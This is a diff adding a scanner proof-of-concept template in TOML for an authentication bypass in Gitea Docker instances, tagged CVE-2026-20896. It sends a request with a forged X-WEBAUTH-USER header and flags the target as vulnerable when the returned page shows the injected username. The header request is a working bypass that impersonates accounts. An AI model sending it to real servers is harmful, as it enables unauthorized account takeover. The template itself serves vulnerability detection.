@@ -1,0 +1,39 @@
+[info]
+author = "AVE"
+description = "通过发送携带 X-WEBAUTH-USER 标头的 HTTP 请求，检测 Gitea Docker 实例是否信任来自任意来源的反向代理认证标头。若目标返回 200 且页面包含指定用户名，则存在认证绕过漏洞。"
+id = "POC-AVE-2026-0247"
+name = "Gitea Docker 反向代理认证绕过 PoC"
+severity = "critical"
+tags = [
+    "cve-2026-20896",
+    "gitea",
+    "auth-bypass",
+    "reverse-proxy",
+]
+vuln_id = [
+    "CVE-2026-20896",
+    "AVE-2026-0247",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/user/settings"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+X-WEBAUTH-USER = "pocadmin"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["pocadmin"]
